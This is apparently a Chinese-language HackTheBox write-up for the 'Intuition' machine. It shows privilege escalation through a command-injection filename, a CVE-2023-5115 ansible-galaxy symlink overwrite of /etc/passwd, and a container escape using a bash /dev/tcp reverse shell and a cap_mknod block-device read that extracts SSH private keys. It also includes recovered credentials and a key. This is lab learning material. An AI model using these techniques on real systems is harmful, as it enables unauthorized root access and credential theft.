+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:/var/log$ zgrep -H -i <span class="string">&quot;lopez&quot;</span> */*.gz</span><br><span class="line">suricata/eve.json.7.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:43:36.099184+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1988487100549589,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:37522,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:1,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;USER&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;lopez&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;331&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Username ok, send password.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">suricata/eve.json.7.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:43:52.999165+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1988487100549589,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:37522,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:2,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;PASS&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;Lopezzz1992%123&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;530&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Authentication failed.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">suricata/eve.json.7.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:44:32.133372+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1218304978677234,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:45760,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:1,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;USER&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;lopez&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;331&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Username ok, send password.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">suricata/eve.json.7.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:44:48.188361+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1218304978677234,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:45760,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:2,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;PASS&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;Lopezz1992%123&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;230&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Login successful.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429145535-7ba2tsc.png" alt="image">​</p>
+<p>得到了一個神秘的密碼：<code>Lopezz1992%123</code>​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:/var/log$ su lopez</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">lopez@intuition:/var/log$ <span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1003</span>(lopez) gid=<span class="number">1003</span>(lopez) groups=<span class="number">1003</span>(lopez),<span class="number">1004</span>(sys-adm)</span><br></pre></td></tr></table></figure>
+
+<p>就成功的登錄了 <code>lopez</code>​ 這個用戶。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lopez@intuition:/tmp$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> lopez: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> lopez on intuition:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User lopez may run the following commands on intuition:</span><br><span class="line">    (ALL : ALL) /opt/runner2/runner2</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xA8-Unintended-Root-Command-Injection"><a href="#0xA8-Unintended-Root-Command-Injection" class="headerlink" title="0xA8 Unintended Root - Command Injection"></a>0xA8 Unintended Root - Command Injection</h2><p>反編譯這個 <code>runner2</code>​ ，看一下裏面有什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429155902-tqcen9v.png" alt="image">​</p>
+<p>最感興趣的還是這個安裝函數：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429160117-jhncz34.png" alt="image">​</p>
+<p>然後看一下檢查密碼的函數</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429160210-uzb9ntx.png" alt="image">​</p>
+<p>其實就是一開始 runner 1 的hashes，下面就是玩一下上圖中的功能。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lopez@intuition:~$ cat run.json </span><br><span class="line">&#123;<span class="string">&quot;run&quot;</span>:&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;list&quot;</span>&#125;&#125;</span><br><span class="line">lopez@intuition:~$ sudo /opt/runner2/runner2 run.json </span><br><span class="line"><span class="number">1</span>: apt_update.yml</span><br><span class="line"></span><br><span class="line">lopez@intuition:~$ cat run.json </span><br><span class="line">&#123;<span class="string">&quot;run&quot;</span>:&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;run&quot;</span>&#125;,<span class="string">&quot;auth_code&quot;</span>:<span class="string">&quot;UHI75GHINKOP&quot;</span>&#125;</span><br><span class="line">lopez@intuition:~$ sudo /opt/runner2/runner2 run.json </span><br><span class="line">Invalid <span class="string">&#x27;num&#x27;</span> value <span class="keyword">for</span> <span class="string">&#x27;run&#x27;</span> action.</span><br><span class="line"></span><br><span class="line">lopez@intuition:~$ cat run.json </span><br><span class="line">&#123;<span class="string">&quot;run&quot;</span>:&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;run&quot;</span>,<span class="string">&quot;num&quot;</span>:<span class="number">1</span>&#125;,<span class="string">&quot;auth_code&quot;</span>:<span class="string">&quot;UHI75GHINKOP&quot;</span>&#125;</span><br><span class="line">lopez@intuition:~$ sudo /opt/runner2/runner2 run.json </span><br><span class="line"></span><br><span class="line">PLAY [Update <span class="keyword">and</span> Upgrade APT Packages test] *************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] **********************************************************************************************************************************************************************</span><br><span class="line">The authenticity of host <span class="string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">ok: [127.0.0.1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TASK [Update APT Cache] *********************************************************************************************************************************************************************</span></span><br></pre></td></tr></table></figure>
+
+<p>爲了要進行命令注入，可以僞造一個 <code>mane.tar;bash</code>​ 文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lopez@intuition:~$ cat run.json </span><br><span class="line">&#123;<span class="string">&quot;run&quot;</span>:&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;install&quot;</span>,<span class="string">&quot;role_file&quot;</span>:<span class="string">&quot;/home/lopez/mane.tar;bash&quot;</span>&#125;,<span class="string">&quot;auth_code&quot;</span>:<span class="string">&quot;UHI75GHINKOP&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 這一步是隨便做一個 tar 文件，文件内容其實不需要理會，反正最後都會失敗。</span></span><br><span class="line">lopez@intuition:~$ tar -cf mane.tar\;bash run.json                                 </span><br><span class="line">lopez@intuition:~$ ls                 </span><br><span class="line"><span class="string">&#x27;mane.tar;bash&#x27;</span>   run.json</span><br><span class="line">lopez@intuition:~$ sudo /opt/runner2/runner2 run.json   </span><br></pre></td></tr></table></figure>
+
+<p>然後就得到root：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429000813-rsuw2t9.png" alt="image">​</p>
+<h2 id="0x8-Intended-Root-CVE-2023-5115"><a href="#0x8-Intended-Root-CVE-2023-5115" class="headerlink" title="0x8 Intended Root - CVE-2023-5115"></a>0x8 Intended Root - CVE-2023-5115</h2><p>由於上面的是調用 <code>ansible-galaxy</code>​ ，所以去網上搜索一下關於這個的exploit，然後找到 CVE-2023-5115：</p>
+<blockquote>
+<p>When installing a maliciously created Ansible role using <code>ansible-galaxy role install</code>​, arbitrary files the user has access to can be overwritten. The malicious role must contain a symlink with an absolute path to the target file, followed by a file of the same name (as the symlink) with the contents to write to the target.</p>
+<p><strong>Mauro Matteo Cascella</strong> <strong>2023-08-23 14:20:25 UTC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://bugzilla.redhat.com/show_bug.cgi?id=2233810">https://bugzilla.redhat.com/show_bug.cgi?id=2233810</a></p>
+</blockquote>
+<p>根據上面提示，可以寫入任意文件，這樣可以直接寫入 &#x2F;etc&#x2F;passwd 來得到root，參考：<a target="_blank" rel="noopener" href="https://github.com/manesec/maketoolkit-db/blob/main/Notes/Linux/Edit%20passwd%20to%20login.md">https://github.com/manesec/maketoolkit-db/blob/main/Notes/Linux/Edit%20passwd%20to%20login.md</a></p>
+<p>也就是在 <code>/etc/passwd</code>​ 加一行 <code>mane:manehack$rerzZaiHYZZXpZsGcJF8n1:0:0:root:/root:/bin/bash</code>​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 開始之前先新建一個項目</span></span><br><span class="line">lopez@intuition:~$ ansible-galaxy init mane</span><br><span class="line">[WARNING]: Skipping plugin (/usr/lib/python3/dist-packages/ansible/plugins/filter/core.py) as it seems to be invalid: cannot import name <span class="string">&#x27;environmentfilter&#x27;</span> from <span class="string">&#x27;jinja2.filters&#x27;</span></span><br><span class="line">(/usr/local/lib/python3.11/dist-packages/jinja2/filters.py)</span><br><span class="line">[WARNING]: Skipping plugin (/usr/lib/python3/dist-packages/ansible/plugins/filter/mathstuff.py) as it seems to be invalid: cannot import name <span class="string">&#x27;environmentfilter&#x27;</span> from <span class="string">&#x27;jinja2.filters&#x27;</span></span><br><span class="line">(/usr/local/lib/python3.11/dist-packages/jinja2/filters.py)</span><br><span class="line">- Role mane was created successfully</span><br><span class="line"></span><br><span class="line">lopez@intuition:~$ <span class="built_in">ls</span></span><br><span class="line">mane</span><br><span class="line">lopez@intuition:~$ <span class="built_in">cd</span> mane</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一個軟鏈接</span></span><br><span class="line">lopez@intuition:~/mane$ <span class="built_in">ln</span> -s /etc/passwd</span><br><span class="line">lopez@intuition:~/mane$ <span class="built_in">ls</span></span><br><span class="line">passwd  defaults  handlers  meta  README.md  tasks  tests  vars</span><br><span class="line">lopez@intuition:~/mane$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然後出去打包成 tar </span></span><br><span class="line">lopez@intuition:~$ tar -cf mane.tar mane/</span><br><span class="line">lopez@intuition:~$ <span class="built_in">ls</span></span><br><span class="line">mane  mane.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然後刪除這個軟鏈接</span></span><br><span class="line">lopez@intuition:~$ <span class="built_in">rm</span> mane/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然後嘗試寫 /etc/passwd </span></span><br><span class="line">lopez@intuition:~$ <span class="built_in">cp</span> /etc/passwd mane/passwd</span><br><span class="line">lopez@intuition:~$ <span class="built_in">echo</span> <span class="string">&#x27;mane:$1$manehack$rerzZaiHYZZXpZsGcJF8n1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; mane/passwd</span><br><span class="line">lopez@intuition:~$ tar --append --file=mane.tar mane/passwd</span><br></pre></td></tr></table></figure>
+
+<p>這樣的payload 就製作好了，這個時候還需要做一個文件給 runner2，去調用製作好的payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;run&quot;</span>:&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;install&quot;</span>,<span class="string">&quot;role_file&quot;</span>:<span class="string">&quot;mane.tar&quot;</span>&#125;,<span class="string">&quot;auth_code&quot;</span>:<span class="string">&quot;UHI75GHINKOP&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之後就可以運行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/runner2/runner2 mane.json</span><br></pre></td></tr></table></figure>
+
+<p>結果如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429170513-a9470re.png" alt="image">​</p>
+<h2 id="0xB8-Unintended-Root-Container-Escape"><a href="#0xB8-Unintended-Root-Container-Escape" class="headerlink" title="0xB8 Unintended Root - Container Escape"></a>0xB8 Unintended Root - Container Escape</h2><p>回到 0x5，看到有4444端口，於是轉發這個端口到本地：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 127.0.0.1:4444:127.0.0.1:4444 -i ssh_key dev_acc@10.129.200.249</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429170829-yrmluf7.png" alt="image">​</p>
+<p>這裏有一個按鈕，可以讓你看到裏面的VNC，但是需要密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428203504-oiwhwnw.png" alt="image">​</p>
+<p>於是上網找了一下默認的密碼，發現：<a target="_blank" rel="noopener" href="https://github.com/SeleniumHQ/docker-selenium/issues/1455" title="https://github.com/SeleniumHQ/docker-selenium/issues/1455">https://github.com/SeleniumHQ/docker-selenium/issues/1455</a></p>
+<p>也就是默認的密碼是：<code>secret</code>​，進去了之後你會看到有一個這樣的窗口：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428203536-m1vq0qf.png" alt="image">​</p>
+<p>最小化來到桌面，可以看得出來是fluxbox，然後就可以去找 fluxbox的配置文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429171022-qcf9vgk.png" alt="image">​</p>
+<p>這裏可以開啓一個無痕窗口：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428204845-88zyrvr.png" alt="image">​</p>
+<p>一般的配置文件會放到用戶的家路徑下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428212309-s3hp0rb.png" alt="image">​</p>
+<p>這是原本的内容，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[begin] (fluxbox)</span><br><span class="line">[include] (/etc/X11/fluxbox/fluxbox-menu)</span><br><span class="line">[end]</span><br></pre></td></tr></table></figure>
+
+<p>根據文檔可以加一個 bash reverse shell：<a target="_blank" rel="noopener" href="https://manpages.ubuntu.com/manpages/focal/en/man5/fluxbox-menu.5.html">https://manpages.ubuntu.com/manpages/focal/en/man5/fluxbox-menu.5.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[begin] (fluxbox)</span><br><span class="line">[include] (/etc/X11/fluxbox/fluxbox-menu)</span><br><span class="line">[<span class="built_in">exec</span>] (ManeShell) &#123;/<span class="built_in">bin</span>/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.21/1111 0&gt;&amp;1&#x27;</span>&#125;</span><br><span class="line">[end]</span><br></pre></td></tr></table></figure>
+
+<p>用python http server，經過瀏覽器右鍵另存爲覆蓋menu文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428210523-hdcyjji.png" alt="image">​</p>
+<p>在桌面 右鍵你就得到了一個 shell</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428212448-u0a0b2b.png" alt="image">​</p>
+<p>點一下就得到了shell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428212512-9lf0m36.png" alt="image">​</p>
+<p>sudo -l 可以看到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> seluser on 3216154ec4c0:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span>\:/snap/<span class="built_in">bin</span>, use_pty</span><br><span class="line"></span><br><span class="line">User seluser may run the following commands on 3216154ec4c0:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<p>啊，直接可以 <code>sudo -s</code>​ 獲得 root權限， 然後跑一下 deepce：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429171645-yb17fon.png" alt="image">​</p>
+<p>網上搜一下 <code>cap_mknod exploit docker</code>​ ，找到這篇：<a target="_blank" rel="noopener" href="https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot">https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot</a></p>
+<p>我就是沒注意看這一句話：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429171942-aiymqkr.png" alt="image">​</p>
+<p>然後就做了個錯誤的示範 QAQ …</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428224946-amcjj5k.png" alt="image">​</p>
+<p>你可以從上圖看到這樣bug出來不會有root權限。</p>
+<p>從上面的文章中可以看到一些内容，儅你有了 <code>cap_mknod</code>​ 這個權限后，你可以在 container 裏面直接連接塊設備，這樣的話就可以對塊設備進行訪問，因爲在容器裏面塊設備是沒有權限可以訪問，不過可以製作一個塊設備連接符：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429172345-fhsra9m.png" alt="image">​</p>
+<p>爲了讓宿主的用戶可以訪問到裏面的内存空間，可以通過進程文件系統來交互，但這樣做是需要建立一個和宿主一樣的低權限用戶，否則在宿主就沒辦法以低權限的用戶訪問 <code>/proc</code>​：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@3216154ec4c0:/<span class="comment"># echo &#x27;dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash&#x27; &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>爲了更好的識別這個進程，我直接複製一個出來：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@3216154ec4c0:~<span class="comment"># cp /bin/bash /mane</span></span><br></pre></td></tr></table></figure>
+
+<p>然後使用低權限運行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@3216154ec4c0:~<span class="comment"># sudo -u dev_acc /mane</span></span><br><span class="line"><span class="built_in">groups</span>: cannot find name <span class="keyword">for</span> group ID 1001</span><br><span class="line"></span><br><span class="line">dev_acc@3216154ec4c0:/root$ <span class="built_in">id</span></span><br><span class="line">uid=1001(dev_acc) gid=1001 <span class="built_in">groups</span>=1001</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以在宿主更好的識別進程，然後從進程進去裏面的文件系統：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429173317-vcrmt17.png" alt="image">​</p>
+<p>然後我就可以暴力枚舉：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:~$ grep -a -A 80 <span class="string">&quot;BEGIN OPENSSH PRIVATE KEY&quot;</span> /proc/2710/root/sda   </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429173441-sdwo631.png" alt="image">​</p>
+<p>然後一個一個試下這些key能不能用，最後盲猜到了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAo4Ls/s2mrp2hQVoKi9svIbQEuCH4+QK8Aj6kxfuPejezPGysOjsQ</span><br><span class="line">/k7HqLfwdguvoGhkksfYhsCSgur3XjXAQwilSlJcA9Y1UxP9QQxWRMrzQXgyLnteUoIXD1</span><br><span class="line">UOm2FuKwfkg2glGuOmLNcDCIQG2jhgFgDbgXRb5YndrFPB5Ai/ZwDBMkjzVLyUvEcIV5lm</span><br><span class="line">0ryTF9zSStz9OZW5xq6hLyRRohi5igjsGKjpCHU4uAbNhlZnjpyIpdoK/BiQChaBPCZdBf</span><br><span class="line">S7mqJSh1LeRq5F7iLu1cZxSnOb/JBAlOptdEFuGa5RxewoGLR+x0kdCICwgWupi3cIyhRo</span><br><span class="line">hmDTtpavfEDWgEGTYj65uprI2quU6j1jwgJfZG9gPh8zWav3zfSlDmbK98vvHePfMvqwdR</span><br><span class="line">qVRgXzccPqdwIpU2Yqrk68TL0G8O4QnUAkqWq9qtAAAFgGv/8g9r//IPAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKOC7P7Npq6doUFaCovbLyG0BLgh+PkCvAI+pMX7j3o3szxsrDo7EEddsrTd1M1F</span><br><span class="line">RjaGJg2meV/vPaKwrjNLTuPsnLWIcXeG0ngbWRyCJLj82RmDd81CbU+lxBmv5Ox6i38HYL</span><br><span 